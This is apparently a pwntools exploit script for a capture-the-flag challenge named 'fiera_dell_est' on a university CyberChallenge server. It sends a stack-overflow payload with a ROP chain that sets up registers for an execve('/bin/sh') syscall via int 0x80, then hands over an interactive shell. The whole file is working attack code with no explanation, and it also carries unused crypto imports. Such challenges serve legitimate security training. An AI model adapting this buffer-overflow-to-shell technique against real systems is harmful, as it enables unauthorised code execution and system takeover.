from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes, bytes_to_long
import string
import math

# context.terminal=["tmux", "splitw", "-h"]
# elf = ELF('./fiera_dell_est')
# p = elf.process()
p = remote("cyberchallenge.diag.uniroma1.it", 5015)
bin_sh = 0x0804A02C
payload = b"AAAA"+ b'A'*12
payload += p32(0x0804851D) #pop eax
payload += p32(0x0b) #0xb
payload += p32(0x8048526) #pop ebx
payload += p32(bin_sh) #bin_sh
payload += p32(0x8048528) #pop edx
payload += p32(0x0) #0
payload += p32(0x804852B) #pop ecx
payload += p32(0x0) #0
payload += p32(0x0804852D) #int 0x80

# ui.pause()
# gdb.attach(p)

p.send(payload)


p.interactive()